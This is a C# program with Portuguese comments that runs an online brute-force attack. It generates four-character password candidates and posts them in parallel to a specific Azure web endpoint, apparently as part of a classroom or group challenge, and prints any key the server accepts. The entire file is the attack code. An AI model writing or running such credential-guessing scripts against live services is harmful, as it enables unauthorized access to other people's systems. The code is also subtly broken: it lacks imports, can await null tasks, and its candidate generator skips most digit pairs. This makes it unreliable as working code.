using System;
using System.Collections.Concurrent;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        // URL da API que receberá a tentativa de senha
        string apiUrl = "https://fiapnet.azurewebsites.net/fiap";

        // Defina o conjunto de caracteres para gerar as combinações
        const string letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const string digits = "0123456789";
        const string lowerLetters = "abcdefghijklmnopqrstuvwxyz";

        // Tente descobrir a senha com exatamente 4 caracteres seguindo o padrão
        string crackedPassword = await BruteForcePassword(apiUrl, letters, digits, lowerLetters);

        if (crackedPassword != null)
        {
            Console.WriteLine($"Senha descoberta: {crackedPassword}");
        }
        else
        {
            Console.WriteLine("Senha não encontrada.");
        }
    }

    static async Task<string> BruteForcePassword(string apiUrl, string letters, string digits, string lowerLetters)
    {
        using (HttpClient client = new HttpClient())
        {
            // Define o número de tarefas paralelas
            int maxDegreeOfParallelism = Environment.ProcessorCount;

            // Usa uma estrutura para gerar combinações em paralelo
            var combinations = GenerateCombinations(letters, digits, lowerLetters);

            // Usa um BlockingCollection para gerenciar a concorrência
            var foundPassword = new ConcurrentBag<string>();

            var tasks = new Task[maxDegreeOfParallelism];
            int index = 0;

            foreach (var combination in combinations)
            {
                if (index >= maxDegreeOfParallelism)
                {
                    await Task.WhenAny(tasks);
                    index = Array.FindIndex(tasks, t => t.IsCompleted);
                }

                tasks[index] = Task.Run(async () =>
                {
                    if (foundPassword.Count > 0) return; // Se já encontrou a senha, não continua

                    string responseMessage = await TestPassword(client, apiUrl, combination);

                    if (responseMessage.Contains("##")) // Ajustado conforme a resposta esperada da API
                    {
                        foundPassword.Add(combination);
                    }
                });

                index++;
            }

            await Task.WhenAll(tasks);
            return foundPassword.Count > 0 ? foundPassword.First() : null;
        }
    }

    static IEnumerable<string> GenerateCombinations(string letters, string digits, string lowerLetters)
    {
        var result = new List<string>();

        foreach (char upper in letters)
        {
            for (int i = 0; i < digits.Length - 1; i++)
            {
                char digit1 = digits[i];
                char digit2 = digits[i + 1];

                foreach (char lower in lowerLetters)
                {
                    result.Add($"{upper}{digit1}{digit2}{lower}");
                }
            }
        }

        return result;
    }

    static async Task<string> TestPassword(HttpClient client, string apiUrl, string passwordAttempt)
    {
        // Cria o conteúdo da requisição com a tentativa de senha
        var content = new StringContent($"{{\"Key\": \"{passwordAttempt}\", \"grupo\": \"1\"}}", Encoding.UTF8, "application/json");
        Console.WriteLine(passwordAttempt);
        // Envia a requisição POST
        HttpResponseMessage response = await client.PostAsync(apiUrl, content);

        // Lê o conteúdo da resposta da API como uma string
        string responseBody = await response.Content.ReadAsStringAsync();
        Console.WriteLine(responseBody);

        // Retorna a mensagem de resposta da API
        return responseBody;
    }
}